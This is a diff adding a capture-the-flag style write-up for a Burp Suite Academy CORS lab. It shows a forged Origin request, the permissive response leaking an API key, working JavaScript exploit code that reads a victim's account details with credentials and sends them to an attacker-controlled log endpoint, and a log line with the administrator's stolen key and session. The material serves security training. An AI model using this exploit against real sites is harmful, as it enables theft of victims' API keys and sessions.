@@ -1,0 +1,55 @@
+##################################
+#       CORS Vulnerabilities     #
+#   1st Lab in Burp Suite Academy #
+##################################
+
+######## Add Origin Header to Burp in /accountDetails ########
+
+GET /accountDetails HTTP/2
+Host: 0a6300560383e91681cf6b2800430030.web-security-academy.net
+Origin: https://evil-server.com/
+
+######## And now we can see Response: ########
+
+HTTP/2 200 OK
+Access-Control-Allow-Origin: https://evil-server.com/
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "xzIYPNmj54pYYw8rVFZzxwcLDZHpxaWn",
+  "sessions": [
+    "gl5fzb0zWRyXIV1vdPFQWnBiFoO7aovT"
+  ]
+}
+
+######## Now we can use it ########
+######## Writing exploit code to our server ########
+
+<html>
+    <body>
+        <script>
+            var req = new XMLHttpRequest();
+            req.onreadystatechange = function () {
+                if (req.readyState == XMLHttpRequest.DONE) {
+                    fetch("/log?key=" + req.responseText)
+                }
+            }
+            req.open('GET', "https://0a6300560383e91681cf6b2800430030.web-security-academy.net/accountDetails", true);
+            req.withCredentials = true;
+            req.send(null);
+        </script>
+    </body>
+</html>
+
+######## Send it to the administrator and you can find the API key ########
+
+10.0.3.233      2024-07-14 14:54:02 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22rvAjMsoBsjsJ4HhpSb2ENnGt2sAiVEul%22,%20%20%22sessions%22:%20[%20%20%20%20%22b5a1AiU0MMko5rgatv17C8LEWFWwwDHV%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
+
+################
+GAME OVER
+################
